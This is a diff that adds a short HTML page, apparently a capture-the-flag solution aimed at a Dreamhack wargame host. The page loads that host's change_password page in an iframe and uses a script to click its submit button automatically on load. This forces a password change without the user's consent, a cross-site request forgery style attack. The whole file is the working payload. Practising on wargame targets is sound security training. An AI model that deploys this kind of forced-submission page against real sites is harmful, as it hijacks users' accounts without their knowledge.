@@ -1,0 +1,29 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Submit Button in iFrame</title>
+</head>
+<body>
+
+<iframe id="myFrame" src="http://host3.dreamhack.games:22879/change_password"></iframe>
+
+<script>
+window.onload = function() {
+    var iframe = document.getElementById('myFrame');
+    iframe.onload = function() {
+        var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+        var submitButton = innerDoc.querySelector('input[type="submit"]');
+        if (submitButton) {
+            submitButton.click();
+        } else {
+            console.log('Submit button not found in the iframe.');
+        }
+    };
+};
+</script>
+
+</body>
+</html>
